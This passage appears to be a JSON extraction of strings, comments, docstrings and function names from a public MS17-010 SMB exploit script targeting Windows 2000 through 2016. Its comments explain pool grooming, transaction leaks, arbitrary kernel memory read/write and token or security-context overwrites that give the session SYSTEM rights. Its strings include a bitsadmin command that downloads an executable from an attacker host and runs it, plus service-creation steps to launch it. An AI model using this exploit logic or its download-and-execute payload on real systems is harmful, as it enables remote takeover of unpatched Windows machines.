        "'modify transaction struct for arbitrary read/write'",
        "'TRANS_SIZE'",
        "'fid'",
        "'<'",
        "'TRANS_INPARAM_OFFSET'",
        "'fid'",
        "'<H'",
        "'TRANS_MID_OFFSET'",
        "'connection'",
        "'session'",
        "'trans1_mid'",
        "'trans1_addr'",
        "'trans2_mid'",
        "'trans2_addr'",
        "'<BB5xB'",
        "'I'",
        "'<BB5xB'",
        "'II'",
        "'<BB5xB'",
        "'I'",
        "'<BB5xB'",
        "'I'",
        "'PTR_SIZE'",
        "''",
        "'<'",
        "'PTR_FMT'",
        "''",
        "'Target OS: '",
        "\"Windows 7 \"",
        "\"Windows Server 2008 R2\"",
        "'os'",
        "'WIN7'",
        "'method'",
        "\"Windows 8\"",
        "\"Windows Server 2012 \"",
        "\"Windows Server 2016 \"",
        "\"Windows 10\"",
        "'os'",
        "'WIN8'",
        "'method'",
        "\"Windows Server (R) 2008\"",
        "'Windows Vista'",
        "'os'",
        "'WIN7'",
        "'method'",
        "\"Windows Server 2003 \"",
        "'os'",
        "'WIN2K3'",
        "'method'",
        "\"Windows 5.1\"",
        "'os'",
        "'WINXP'",
        "'arch'",
        "'x86'",
        "'method'",
        "\"Windows XP \"",
        "'os'",
        "'WINXP'",
        "'arch'",
        "'x64'",
        "'method'",
        "\"Windows 5.0\"",
        "'os'",
        "'WIN2K'",
        "'arch'",
        "'x86'",
        "'method'",
        "'This exploit does not support this target'",
        "'Not found accessible named pipe'",
        "'Using named pipe: '",
        "'method'",
        "'PTR_FMT'",
        "'make this SMB session to be SYSTEM'",
        "'session'",
        "'SESSION_ISNULL_OFFSET'",
        "'\\x00\\x01'",
        "'session'",
        "'<'",
        "'SESSION_SECCTX_OFFSET'",
        "'PCTXTHANDLE_TOKEN_OFFSET'",
        "'SECCTX_PCTXTHANDLE_OFFSET'",
        "'SECCTX_PCTXTHANDLE_OFFSET'",
        "'<'",
        "'PCTXTHANDLE_TOKEN_OFFSET'",
        "'<'",
        "'current TOKEN addr: 0x{:x}'",
        "'PTR_SIZE'",
        "'<I'",
        "'TOKEN_USER_GROUP_CNT_OFFSET'",
        "'<'",
        "'TOKEN_USER_GROUP_ADDR_OFFSET'",
        "'userAndGroupCount: 0x{:x}'",
        "'userAndGroupsAddr: 0x{:x}'",
        "'overwriting token UserAndGroups'",
        "'TOKEN_USER_GROUP_CNT_OFFSET'",
        "'<I'",
        "'SECCTX_SIZE'",
        "'overwriting session security context'",
        "'FAKE_SECCTX'",
        "'arch'",
        "'PCTXTHANDLE_TOKEN_OFFSET'",
        "'TOKEN_USER_GROUP_CNT_OFFSET'",
        "'<I'",
        "r'cmd /c bitsadmin /transfer pwn /download http://%s/%s.exe C:\\%s.exe'",
        "r'cmd /c /%s.exe'",
        "'rb'",
        "'$'",
        "''",
        "'svcctl'",
        "\"Opening SVCManager on %s.....\"",
        "'lpScHandle'",
        "'\\x00'",
        "'ERROR_SERVICE_DOES_NOT_EXIST'",
        "'lpServiceHandle'",
        "'lpServiceHandle'",
        "'Creating service %s.....'",
        "'\\x00'",
        "'\\x00'",
        "'\\x00'",
        "'lpServiceHandle'",
        "'Starting service %s.....'",
        "'Removing service %s.....'",
        "\"ServiceExec Error on: %s\"",
        "\"{} <ip> [pipe_name] [username] [password] [lhost] [payload]\"",
        "'Done'"
    ],
    "variables": [
        "WIN7_64_SESSION_INFO",
        "WIN7_32_SESSION_INFO",
        "WIN8_64_SESSION_INFO",
        "WIN8_32_SESSION_INFO",
        "WIN2K3_64_SESSION_INFO",
        "WIN2K3_32_SESSION_INFO",
        "WINXP_32_SESSION_INFO",
        "WIN2K_32_SESSION_INFO",
        "WIN7_32_TRANS_INFO",
        "WIN7_64_TRANS_INFO",
        "WIN5_32_TRANS_INFO",
        "WIN5_64_TRANS_INFO",
        "X86_INFO",
        "X64_INFO",
        "result",
        "OS_ARCH_INFO",
        "TRANS_NAME_LEN",
        "HEAP_HDR_SIZE",
        "pipes",
        "tid",
        "found_pipe",
        "fid",
        "found_pipe",
        "special_mid",
        "extra_last_mid",
        "special_mid",
        "extra_last_mid",
        "GROOM_TRANS_SIZE",
        "info",
        "mid",
        "req1",
        "req2",
        "leakData",
        "leakData",
        "info",
        "info",
        "info",
        "info",
        "fmt",
        "new_data",
        "read_data",
        "info",
        "trans_param",
        "mid_ntrename",
        "req1",
        "req2",
        "req3",
        "reqs",
        "mid",
        "leakData",
        "leakData",
        "leakData",
        "expected_size",
        "leakTransOffset",
        "leakTrans",
        "ptrf",
        "_",
        "connection_addr",
        "session_addr",
        "treeconnect_addr",
        "flink_value",
        "inparam_value",
        "leak_mid",
        "next_page_addr",
        "tid",
        "fid",
        "info",
        "info",
        "bridePoolSize",
        "info",
        "info",
        "leakInfo",
        "leakInfo",
        "tid",
        "fid",
        "info",
        "shift_indata_byte",
        "indata_value",
        "indata_next_trans_displacement",
        "recvPkt",
        "fmt",
        "info",
        "tid",
        "fid",
        "info",
        "attempt_list",
        "attempt_list",
        "trans_param",
        "mid",
        "shift_indata_byte",
        "success",
        "HEAP_CHUNK_PAD_SIZE",
        "NEXT_TRANS_OFFSET",
        "recvPkt",
        "success",
        "info",
        "TRANS_CHUNK_SIZE",
        "PREV_TRANS_DISPLACEMENT",
        "PREV_TRANS_OFFSET",
        "leakData",
        "leakData",
        "leakTranOffset",
        "leakTrans",
        "fmt",
        "_",
        "connection_addr",
        "session_addr",
        "treeconnect_addr",
        "flink_value",
        "inparam_value",
        "outparam_value",
        "indata_value",
        "trans2_mid",
        "trans2_addr",
        "trans1_addr",
        "TRANS_OFFSET",
        "trans1_mid",
        "SID_SYSTEM",
        "SID_ADMINISTRATORS",
        "SID_AUTHENICATED_USERS",
        "SID_EVERYONE",
        "sids",
        "attrs",
        "fakeUserAndGroupCount",
        "fakeUserAndGroupsAddr",
        "addr",
        "fakeUserAndGroups",
        "conn",
        "info",
        "server_os",
        "info",
        "info",
        "info",
        "info",
        "info",
        "info",
        "info",
        "info",
        "info",
        "info",
        "info",
        "info",
        "info",
        "info",
        "info",
        "info",
        "info",
        "pipe_name",
        "fmt",
        "sessionData",
        "secCtxAddr",
        "pctxtDataInfo",
        "pctxtDataAddr",
        "pctxtDataAddr",
        "tokenAddrInfo",
        "tokenAddr",
        "tokenData",
        "userAndGroupCount",
        "userAndGroupsAddr",
        "fakeUserAndGroupCount",
        "fakeUserAndGroups",
        "secCtxData",
        "userAndGroupsOffset",
        "smbConn",
        "service_name",
        "rpcsvc",
        "svcHandle",
        "resp",
        "svcHandle",
        "resp",
        "resp",
        "serviceHandle",
        "target",
        "pipe_name",
        "USERNAME",
        "PASSWORD",
        "lhost",
        "payl"
    ],
    "comments": [
        "!/usr/bin/python",
        "USERNAME = ''",
        "PASSWORD = ''",
        "",
        "info for modify session security context",
        "",
        "win8+ info",
        "win 2003 (xp 64 bit is win 2003)",
        "Win2k3 has another struct to keep PCtxtHandle (similar to 2008+)",
        "PCtxtHandle is at offset 0x8 but only upperPart is needed",
        "Win2k3 has another struct to keep PCtxtHandle (similar to 2008+)",
        "PCtxtHandle is at offset 0x8 but only upperPart is needed",
        "win xp",
        "PCtxtHandle is at offset 0x80 but only upperPart is needed",
        "PCtxtHandle is at offset 0x80 but only upperPart is needed",
        "",
        "info for exploitation",
        "",
        "for windows 2008+",
        "struct size",
        "struct size",
        "struct size",
        "struct size",
        "for Windows Vista, 2008, 7 and 2008 R2",
        "for Windows 8 and later",
        "heap chunk header size",
        "time.sleep(0.05)",
        "send echo is faster than sleep(0.05) when connection is very good",
        "Borrow 'groom' and 'bride' word from NSA tool",
        "GROOM_TRANS_SIZE includes transaction name, parameters and data",
        "Note: the GROOM_TRANS_SIZE size MUST be multiple of 16 to make FRAG_TAG_OFFSET valid",
        "this method can be used on Windows Vista/2008 and later",
        "leak \"Frag\" pool size and determine target architecture",
        "A \"Frag\" pool is placed after the large pool allocation if last page has some free space left.",
        "A \"Frag\" pool size (on 64-bit) is 0x10 or 0x20 depended on Windows version.",
        "To make exploit more generic, exploit does info leak to find a \"Frag\" pool size.",
        "From the leak info, we can determine the target architecture too.",
        "leak more 276 bytes",
        "skip parameters and its own input",
        "Detect target architecture and calculate frag pool size",
        "modify trans2.OutParameter to leak next transaction and trans2.OutData to leak real data",
        "modify trans2.*ParameterCount and trans2.*DataCount to limit data",
        "OutParameter, InData, OutData",
        "SetupCount, MaxSetupCount",
        "ParamterCount, TotalParamterCount, MaxParameterCount",
        "DataCount, TotalDataCount, MaxDataCount",
        "Category, Function (NT_RENAME)",
        "create one more transaction before leaking data",
        "- next transaction can be used for arbitrary read/write after the current trans2 is done",
        "- next transaction address is from TransactionListEntry.Flink value",
        "finish the trans2 to leak",
        "set new trans2 address",
        "set trans1.InData to &trans2",
        "modify trans2 mid",
        "no need to return parameter",
        "trans2.InData",
        "write data",
        "param for NT_RENAME",
        "fill large pagedpool holes (maybe no need)",
        "first GROOM, for leaking next BRIDE transaction",
        "leak more 276 bytes",
        "second GROOM, for controlling next BRIDE transaction",
        "many BRIDEs, expect two of them are allocated at splitted pool from GROOM",
        "expected transactions alignment (\"Frag\" pool is not shown)",
        "",
        "|         5 * PAGE_SIZE         |   PAGE_SIZE    |         5 * PAGE_SIZE         |   PAGE_SIZE    |",
        "+-------------------------------+----------------+-------------------------------+----------------+",
        "|    GROOM mid=mid_ntrename        |  extra_mid1 |         GROOM mid=fid            |  extra_mid2 |",
        "+-------------------------------+----------------+-------------------------------+----------------+",
        "",
        "If transactions are aligned as we expected, BRIDE transaction with mid=extra_mid1 will be leaked.",
        "From leaked transaction, we get",
        "- leaked transaction address from InParameter or InData",
        "- transaction, with mid=extra_mid2, address from LIST_ENTRY.Flink",
        "With these information, we can verify the transaction aligment from displacement.",
        "skip parameters and its own input",
        "open('leak.dat', 'wb').write(leakData)",
        "================================",
        "verify leak data",
        "================================",
        "check pool tag and size value in buffer header",
        "trans1: leak transaction",
        "trans2: next transaction",
        "for Windows 7/2008 R2 and later",
        "fid for first open is always 0x4000. We can open named pipe multiple times to get other fids.",
        "add os and arch specific exploit info",
        "groom: srv buffer header",
        "groom paramters and data is alignment by 8 because it is NT_TRANS",
        "alignment (4)",
        "bride: srv buffer header, pool header (same as pool align size), empty transaction name (4)",
        "bride paramters and data is alignment by 4 because it is TRANS",
        "================================",
        "try align pagedpool and leak info until satisfy",
        "================================",
        "max attempt: 10",
        "================================",
        "shift transGroom.Indata ptr with SmbWriteAndX",
        "================================",
        "Note: Even the distance between bride transaction is exactly what we want, the groom transaction might be in a wrong place.",
        "So the below operation is still dangerous. Write only 1 byte with '\\x00' might be safe even alignment is wrong.",
        "maxParameterCount (0x1000), trans name (4), param (4)",
        "if the overwritten is correct, a modified transaction mid should be special_mid now.",
        "a new transaction with special_mid should be error.",
        "invalid SMB",
        "NSA exploit set refCnt on leaked transaction to very large number for reading data repeatly",
        "but this method make the transation never get freed",
        "I will avoid memory leak",
        "================================",
        "modify trans1 struct to be used for arbitrary read/write",
        "================================",
        "use transGroom to modify trans2.InData to &trans1. so we can modify trans1 with trans2 data",
        "modify",
        "- trans1.InParameter to &trans1. so we can modify trans1 struct with itself (trans1 param)",
        "- trans1.InData to &trans2. so we can modify trans2 with trans1 data",
        "modify trans2.mid",
        "for Windows Vista/2008 and earlier",
        "fid for first open is always 0x4000. We can open named pipe multiple times to get other fids.",
        "leak_frag_size() can be used against Windows Vista/2008 to determine target architecture",
        "add os and arch specific exploit info",
        "do not know target architecture",
        "this case is only for Windows 2003",
        "try offset of 64 bit then 32 bit because no target architecture",
        "================================",
        "groom packets",
        "================================",
        "sum of transaction name, parameters and data length is 0x1000",
        "paramterCount = 0x100-TRANS_NAME_LEN",
        "expected transactions alignment",
        "",
        "+-----------+-----------+-----...-----+-----------+-----------+-----------+-----------+-----------+",
        "|  mid=mid1 |  mid=mid2 |             |  mid=mid8 |  mid=fid  |  mid=mid9 | mid=mid10 | mid=mid11 |",
        "+-----------+-----------+-----...-----+-----------+-----------+-----------+-----------+-----------+",
        "trans1       trans2",
        "================================",
        "shift transaction Indata ptr with SmbWriteAndX",
        "================================",
        "================================",
        "Dangerous operation: attempt to control one transaction",
        "================================",
        "Note: POOL_ALIGN value is same as heap alignment value",
        "Below operation is dangerous. Write only 1 byte with '\\x00' might be safe even alignment is wrong.",
        "if the overwritten is correct, a modified transaction mid should be special_mid now.",
        "a new transaction with special_mid should be error.",
        "invalid SMB",
        "NSA eternalromance modify transaction RefCount to keep controlled and reuse transaction after leaking info.",
        "This is easy to to but the modified transaction will never be freed. The next exploit attempt might be harder",
        "because of this unfreed memory chunk. I will avoid it.",
        "From a picture above, now we can only control trans2 by trans1 data. Also we know only offset of these two",
        "transactions (do not know the address).",
        "After reading memory by modifying and completing trans2, trans2 cannot be used anymore.",
        "To be able to use trans1 after trans2 is gone, we need to modify trans1 to be able to modify itself.",
        "To be able to modify trans1 struct, we need to use trans2 param or data but write backward.",
        "On 32 bit target, we can write to any address if parameter count is 0xffffffff.",
        "On 64 bit target, modifying paramter count is not enough because address size is 64 bit. Because our transactions",
        "are allocated with RtlAllocateHeap(), the HIDWORD of InParameter is always 0. To be able to write backward with offset only,",
        "we also modify HIDWORD of InParameter to 0xffffffff.",
        "on 64 bit, modify InParameter last 4 bytes to \\xff\\xff\\xff\\xff too",
        "modify paramterCount of first transaction",
        "restore trans2.InParameters pointer before leaking next transaction",
        "================================",
        "leak transaction",
        "================================",
        "modify TRANSACTION member to leak info",
        "function=5 (NT_TRANS_RENAME)",
        "parameterCount, totalParameterCount, maxParameterCount, dataCount, totalDataCount",
        "remove param",
        "open('leak.dat', 'wb').write(leakData)",
        "check heap chunk size value in leak data",
        "extract leak transaction data and make next transaction to be trans2",
        "================================",
        "modify trans struct to be used for arbitrary read/write",
        "================================",
        "modify",
        "- trans1.InParameter to &trans1. so we can modify trans1 struct with itself (trans1 param)",
        "- trans1.InData to &trans2. so we can modify trans2 with trans1 data",
        "Note: HIDWORD of trans1.InParameter is still 0xffffffff",
        "modify trans1.mid",
        "SID_SYSTEM and SID_ADMINISTRATORS must be added",
        "- user has no attribute (0)",
        "- 0xe: SE_GROUP_OWNER | SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT",
        "- 0x7: SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY",
        "assume its space is enough for SID_SYSTEM and SID_ADMINISTRATORS (no check)",
        "fake user and groups will be in same buffer of original one",
        "so fake sids size must NOT be bigger than the original sids",
        "set NODELAY to make exploit much faster",
        "Now, read_data() and write_data() can be used for arbitrary read and write.",
        "================================",
        "Modify this SMB session to be SYSTEM",
        "================================",
        "IsNullSession = 0, IsAdmin = 1",
        "read session struct to get SecurityContext address",
        "Windows 2003 and earlier uses only ImpersonateSecurityContext() (with PCtxtHandle struct) for impersonation",
        "Modifying token seems to be difficult. But writing kernel shellcode for all old Windows versions is",
        "much more difficult because data offset in ETHREAD/EPROCESS is different between service pack.",
        "find the token and modify it",
        "copy Token data for restoration",
        "modify UserAndGroups info",
        "the target can use PsImperonateClient for impersonation (Windows 2008 and later)",
        "copy SecurityContext for restoration",
        "see FAKE_SECCTX detail at top of the file",
        "================================",
        "do whatever we want as SYSTEM over this SMB connection",
        "================================",
        "restore SecurityContext/Token",
        "print('creating file c:\\\\pwned.txt on the target')",
        "tid2 = smbConn.connectTree('C$')",
        "fid2 = smbConn.createFile(tid2, '/pwned.txt')",
        "smbConn.closeFile(tid2, fid2)",
        "smbConn.disconnectTree(tid2)",
        "smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')",
        "Note: there are many methods to get shell over SMB admin session",
        "a simple method to get shell (but easily to be detected by AV) is",
        "executing binary generated by \"msfvenom -f exe-service ...\"",
        "based on impacket/examples/serviceinstall.py",
        "Note: using Windows Service to execute command same as how psexec works",
        "Setup up a DCE SMBTransport with the connection already in place",
        "First we try to open the service in case it exists. If it does, we remove it.",
        "Unexpected error",
        "It exists, remove it",
        "Start service",
        "is it really need to stop?",
        "using command line always makes starting service fail because SetServiceStatus() does not get called",
        "print('Stoping service %s.....' % service_name)",
        "scmr.hRControlService(rpcsvc, serviceHandle, scmr.SERVICE_CONTROL_STOP)"
    ],
    "docstrings": [
        "'''\nMS17-010 exploit for Windows 2000 and later by sleepya\n\nEDB Note: mysmb.py can be found here ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py\n\nNote:\n- The exploit should never crash a target (chance should be nearly 0%)\n- The exploit use the bug same as eternalromance and eternalsynergy, so named pipe is needed\n\nTested on:\n- Windows 2016 x64\n- Windows 10 Pro Build 10240 x64\n- Windows 2012 R2 x64\n- Windows 8.1 x64\n- Windows 2008 R2 SP1 x64\n- Windows 7 SP1 x64\n- Windows 2008 SP1 x64\n- Windows 2003 R2 SP2 x64\n- Windows XP SP2 x64\n- Windows 8.1 x86\n- Windows 7 SP1 x86\n- Windows 2008 SP1 x86\n- Windows 2003 SP2 x86\n- Windows XP SP3 x86\n- Windows 2000 SP4 x86\n'''",
        "'''\nA transaction with empty setup:\n- it is allocated from paged pool (same as other transaction types) on Windows 7 and later\n- it is allocated from private heap (RtlAllocateHeap()) with no on use it on Windows Vista and earlier\n- no lookaside or caching method for allocating it\n\nNote: method name is from NSA eternalromance\n\nFor Windows 7 and later, it is good to use matched pair method (one is large pool and another one is fit\nfor freed pool from large pool). Additionally, the exploit does the information leak to check transactions\nalignment before doing OOB write. So this exploit should never crash a target against Windows 7 and later.\n\nFor Windows Vista and earlier, matched pair method is impossible because we cannot allocate transaction size\nsmaller than PAGE_SIZE (Windows XP can but large page pool does not split the last page of allocation). But\na transaction with empty setup is allocated on private heap (it is created by RtlCreateHeap() on initialing server).\nOnly this transaction type uses this heap. Normally, no one uses this transaction type. So transactions alignment\nin this private heap should be very easy and very reliable (fish in a barrel in NSA eternalromance). The drawback\nof this method is we cannot do information leak to verify transactions alignment before OOB write.\nSo this exploit has a chance to crash target same as NSA eternalromance against Windows Vista and earlier.\n'''",
        "'''\nReversed from: SrvAllocateSecurityContext() and SrvImpersonateSecurityContext()\nwin7 x64\nstruct SrvSecContext {\n\tDWORD xx1; // second WORD is size\n\tDWORD refCnt;\n\tPACCESS_TOKEN Token;  // 0x08\n\tDWORD xx2;\n\tBOOLEAN CopyOnOpen; // 0x14\n\tBOOLEAN EffectiveOnly;\n\tWORD xx3;\n\tDWORD ImpersonationLevel; // 0x18\n\tDWORD xx4;\n\tBOOLEAN UsePsImpersonateClient; // 0x20\n}\nwin2012 x64\nstruct SrvSecContext {\n\tDWORD xx1; // second WORD is size\n\tDWORD refCnt;\n\tQWORD xx2;\n\tQWORD xx3;\n\tPACCESS_TOKEN Token;  // 0x18\n\tDWORD xx4;\n\tBOOLEAN CopyOnOpen; // 0x24\n\tBOOLEAN EffectiveOnly;\n\tWORD xx3;\n\tDWORD ImpersonationLevel; // 0x28\n\tDWORD xx4;\n\tBOOLEAN UsePsImpersonateClient; // 0x30\n}\n\nSrvImpersonateSecurityContext() is used in Windows Vista and later before doing any operation as logged on user.\nIt called PsImperonateClient() if SrvSecContext.UsePsImpersonateClient is true. \nFrom https://msdn.microsoft.com/en-us/library/windows/hardware/ff551907(v=vs.85).aspx, if Token is NULL,\nPsImperonateClient() ends the impersonation. Even there is no impersonation, the PsImperonateClient() returns\nSTATUS_SUCCESS when Token is NULL.\nIf we can overwrite Token to NULL and UsePsImpersonateClient to true, a running thread will use primary token (SYSTEM)\nto do all SMB operations.\nNote: for Windows 2003 and earlier, the exploit modify token user and groups in PCtxtHandle to get SYSTEM because only\n  ImpersonateSecurityContext() is used in these Windows versions.\n'''"
    ],
    "functions": [
        "merge_dicts",
        "calc_alloc_size",
        "wait_for_request_processed",
        "find_named_pipe",
        "reset_extra_mid",
        "next_extra_mid",
        "leak_frag_size",
        "read_data",
        "write_data",
        "align_transaction_and_leak",
        "exploit_matched_pairs",
        "exploit_fish_barrel",
        "create_fake_SYSTEM_UserAndGroups",
        "exploit",
        "smb_pwn",
        "smb_send_file",
        "service_exec"
    ],
    "classes": []
}